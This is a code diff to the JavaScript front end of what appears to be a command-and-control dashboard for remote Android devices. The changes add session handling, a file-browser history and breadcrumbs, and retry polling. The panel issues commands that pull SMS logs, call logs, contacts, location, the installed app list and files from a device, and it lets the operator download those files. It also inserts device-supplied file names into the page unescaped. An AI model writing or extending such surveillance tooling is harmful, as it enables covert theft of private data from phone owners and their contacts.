@@ -102,11 +102,16 @@ function updateStats(stats) {
 }
 
 function sendCommand(command, args) {
+    const body = { command, args: args || '{}' };
+    if (currentDeviceSessionId) body.session_id = currentDeviceSessionId;
     return fetch('/api/command', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ command, args: args || '{}' })
-    }).then(r => r.json());
+        body: JSON.stringify(body)
+    }).then(r => r.json()).catch(err => {
+        console.error('sendCommand error:', err);
+        return { status: 'error', error: err };
+    });
 }
 
 function setupDashboardControls() {
@@ -196,10 +201,20 @@ function loadGallery() {
 }
 
 // === FILE BROWSER TAB ===
+let fileBrowserHistory = []; // Track navigation history for back button
+
 function setupFileBrowserControls() {
     document.getElementById('btn-browse-path')?.addEventListener('click', () => {
         const path = document.getElementById('filepath-input').value.trim() || '/storage/emulated/0/';
+        fileBrowserHistory = []; // Reset history on manual browse
         browseFiles(path);
+    });
+    document.getElementById('btn-filebrowser-back')?.addEventListener('click', () => {
+        if (fileBrowserHistory.length > 0) {
+            const prevPath = fileBrowserHistory.pop();
+            document.getElementById('filepath-input').value = prevPath;
+            browseFiles(prevPath, true); // skipHistory=true so we don't re-push
+        }
     });
     document.getElementById('btn-download-file')?.addEventListener('click', () => {
         if (!selectedFileItem) { alert('Select a file first'); return; }
@@ -208,56 +223,110 @@ function setupFileBrowserControls() {
     });
 }
 
-function browseFiles(path) {
+function browseFiles(path, skipHistory) {
     // FIX 3: Get first online device dynamically
     fetch('/api/devices').then(r => r.json()).then(devices => {
         const onlineDevice = devices.find(d => d.status === 'ONLINE');
-        const sessionId = onlineDevice ? onlineDevice.id : 1;
+        sessionId = onlineDevice ? onlineDevice.id : 1;
+
+        // Save current path to history before navigating (unless going back)
+        if (!skipHistory) {
+            const currentPath = document.getElementById('filepath-input').value.trim();
+            if (currentPath && currentPath !== path) {
+                fileBrowserHistory.push(currentPath);
+            }
+        }
+        document.getElementById('filepath-input').value = path;
 
         sendCommand('list_files', JSON.stringify({ path })).then(() => {
             document.getElementById('filebrowser-status').textContent = 'Request sent to device. Waiting for response...';
-            setTimeout(() => {
+            // Poll for response with retries (device may take time)
+            let attempts = 0;
+            const maxAttempts = 5;
+            const pollFiles = () => {
                 fetch('/api/filebrowser?session=' + sessionId).then(r => r.json()).then(data => {
-                    const container = document.getElementById('filebrowser-list');
                     const files = data.files || [];
-                    if (!files.length) { container.innerHTML = '<p>No files returned. Make sure the device is connected and has granted storage permission.</p>'; return; }
-                    // Use files directly as returned by server
-                    let items = files;
-
-                    container.innerHTML = items.map(f => {
-                        const isDir = f.is_dir || f.isDir || false;
-                        const dirIcon = isDir ? '\u{1F4C1}' : '\u{1F4C4}';
-                        return `<div class="fb-item" data-path="${f.path || f.full_path || ''}" data-name="${f.name || ''}" data-isdir="${isDir}">
-                            <span class="fb-icon">${dirIcon}</span>
-                            <span class="fb-name">${f.name || f.display_name || 'Unknown'}</span>
-                            <span class="fb-size">${formatSize(f.size || 0)}</span>
-                            <span class="fb-type">${isDir ? 'DIR' : 'FILE'}</span>
-                        </div>`;
-                    }).join('');
-
-                    container.querySelectorAll('.fb-item').forEach(el => {
-                        el.addEventListener('click', () => {
-                            container.querySelectorAll('.fb-item').forEach(x => x.classList.remove('selected'));
-                            el.classList.add('selected');
-                            const isDir = el.dataset.isdir === 'true';
-                            if (isDir) {
-                                selectedFileItem = null;
-                                document.getElementById('filepath-input').value = el.dataset.path;
-                            } else {
-                                selectedFileItem = { path: el.dataset.path };
-                            }
-                        });
-                        el.addEventListener('dblclick', () => {
-                            if (el.dataset.isdir === 'true') browseFiles(el.dataset.path);
-                        });
-                    });
-                    document.getElementById('filebrowser-status').textContent = `Showing ${items.length} items`;
+                    if (!files.length && attempts < maxAttempts) {
+                        attempts++;
+                        setTimeout(pollFiles, 1000 * attempts);
+                        return;
+                    }
+                    renderFileBrowser(files, path);
                 });
-            }, 3000);
+            };
+            // Small delay to let command reach device
+            setTimeout(pollFiles, 1500);
         });
     }).catch(() => {
         document.getElementById('filebrowser-status').textContent = 'No devices online.';
     });
+}
+
+function renderFileBrowser(files, currentPath) {
+    const container = document.getElementById('filebrowser-list');
+    if (!files.length) {
+        container.innerHTML = '<p>No files returned. Make sure the device is connected and has granted storage permission.</p>';
+        document.getElementById('filebrowser-status').textContent = 'No files found';
+        return;
+    }
+
+    // Build breadcrumb from path
+    const parts = currentPath.split('/').filter(Boolean);
+    let breadcrumb = '<div class="fb-breadcrumb"><button class="fb-crumb" data-path="/">/</button> ';
+    let accumulated = '';
+    parts.forEach((part, i) => {
+        accumulated += '/' + part;
+        breadcrumb += `<button class="fb-crumb" data-path="${accumulated}">${part}</button>`;
+        if (i < parts.length - 1) breadcrumb += ' / ';
+    });
+    breadcrumb += '</div>';
+
+    // Sort: directories first, then alphabetically
+    files.sort((a, b) => {
+        const aDir = a.is_directory || a.is_dir || false;
+        const bDir = b.is_directory || b.is_dir || false;
+        if (aDir !== bDir) return aDir ? -1 : 1;
+        return (a.name || '').toLowerCase().localeCompare((b.name || '').toLowerCase());
+    });
+
+    container.innerHTML = breadcrumb + files.map(f => {
+        const isDir = f.is_directory || f.is_dir || false;
+        const dirIcon = isDir ? '\u{1F4C1}' : '\u{1F4C4}';
+        const fullPath = f.path || f.full_path || '';
+        return `<div class="fb-item${isDir ? ' fb-folder' : ''}" data-path="${fullPath}" data-name="${f.name || ''}" data-isdir="${isDir}">
+            <span class="fb-icon">${dirIcon}</span>
+            <span class="fb-name">${f.name || 'Unknown'}</span>
+            <span class="fb-size">${isDir ? '' : formatSize(f.size || 0)}</span>
+            <span class="fb-type">${isDir ? 'DIR' : 'FILE'}</span>
+        </div>`;
+    }).join('');
+
+    // Single click on folder = navigate into it; single click on file = select
+    container.querySelectorAll('.fb-item').forEach(el => {
+        el.addEventListener('click', () => {
+            const isDir = el.dataset.isdir === 'true';
+            if (isDir) {
+                // Navigate into folder on single click
+                browseFiles(el.dataset.path);
+            } else {
+                container.querySelectorAll('.fb-item').forEach(x => x.classList.remove('selected'));
+                el.classList.add('selected');
+                selectedFileItem = { path: el.dataset.path };
+                document.getElementById('filebrowser-status').textContent = 'Selected: ' + (el.dataset.name || el.dataset.path);
+            }
+        });
+    });
+
+    // Breadcrumb navigation
+    container.querySelectorAll('.fb-crumb').forEach(el => {
+        el.addEventListener('click', () => browseFiles(el.dataset.path));
+    });
+
+    // Update back button state
+    const backBtn = document.getElementById('btn-filebrowser-back');
+    if (backBtn) backBtn.disabled = fileBrowserHistory.length === 0;
+
+    document.getElementById('filebrowser-status').textContent = 'Showing ' + files.length + ' items in ' + currentPath;
 }
 
 // === RECEIVED FILES TAB ===
@@ -328,57 +397,56 @@ function setupDataViewerControls() {
     ];
     btns.forEach(([id, type, renderer]) => {
         document.getElementById(id)?.addEventListener('click', () => {
-            // FIX 4: Get first online device, send command first, then poll with retries
-            fetch('/api/devices').then(r => r.json()).then(devices => {
-                const onlineDevice = devices.find(d => d.status === 'ONLINE');
-                const sessionId = onlineDevice ? onlineDevice.id : 1;
+            const sessionId = currentDeviceSessionId || 1;
 
-                // Map data types to server commands
-                const cmdMap = {
-                    sms_logs: 'get_sms_logs',
-                    call_logs: 'get_call_logs',
-                    contacts: 'get_contacts',
-                    app_list: 'get_app_list',
-                    location: 'get_location',
-                    storage: 'get_storage_info',
-                    device_info: 'get_device_info'
-                };
+            // Map data types to server commands
+            const cmdMap = {
+                sms_logs: 'get_sms_logs',
+                call_logs: 'get_call_logs',
+                contacts: 'get_contacts',
+                app_list: 'get_app_list',
+                location: 'get_location',
+                storage: 'get_storage_info',
+                device_info: 'get_device_info'
+            };
 
-                // Send command to device first
-                if (cmdMap[type]) {
-                    sendCommand(cmdMap[type]);
-                }
+            // Send command to device first
+            if (cmdMap[type]) {
+                sendCommand(cmdMap[type]);
+            }
 
-                // Poll for data with retries (device may take time to respond)
-                let attempts = 0;
-                const maxAttempts = 5;
-                const viewer = document.getElementById('data-viewer');
-                viewer.innerHTML = '<p class="data-loading">Loading... (waiting for device response)</p>';
+            // Poll for data with retries (device may take time to respond)
+            let attempts = 0;
+            const maxAttempts = 5;
+            const viewer = document.getElementById('data-viewer');
+            viewer.innerHTML = '<p class="data-loading">Loading... (waiting for device response)</p>';
 
-                const checkData = () => {
-                    fetch('/api/data?session=' + sessionId + '&type=' + type).then(r => r.json()).then(data => {
+            const checkData = () => {
+                fetch('/api/data?session=' + sessionId + '&type=' + type)
+                    .then(r => r.json())
+                    .then(data => {
                         const result = data[type] || [];
                         const isEmpty = !result || (Array.isArray(result) && !result.length) || (typeof result === 'object' && !Array.isArray(result) && !Object.keys(result).length);
                         if (isEmpty && attempts < maxAttempts) {
                             attempts++;
                             setTimeout(checkData, 1000 * attempts);
                         } else if (isEmpty) {
-                            viewer.innerHTML = `<p class="data-empty">No ${type} data yet. Make sure the device is connected and has granted permissions.</p>`;
+                            viewer.innerHTML = '<p class="data-empty">No ' + type.replace(/_/g, ' ') + ' data yet. Make sure the device is connected and has granted permissions.</p>';
                         } else {
                             viewer.innerHTML = renderer(result);
                         }
-                    }).catch(() => {
+                    })
+                    .catch(() => {
                         if (attempts < maxAttempts) {
                             attempts++;
                             setTimeout(checkData, 1000 * attempts);
                         } else {
-                            viewer.innerHTML = `<p class="data-empty">Error fetching ${type} data.</p>`;
+                            viewer.innerHTML = '<p class="data-empty">Error fetching ' + type.replace(/_/g, ' ') + ' data.</p>';
                         }
                     });
-                };
-                // Small initial delay to let command reach device
-                setTimeout(checkData, 1500);
-            });
+            };
+            // Small initial delay to let command reach device
+            setTimeout(checkData, 1500);
         });
     });
 }
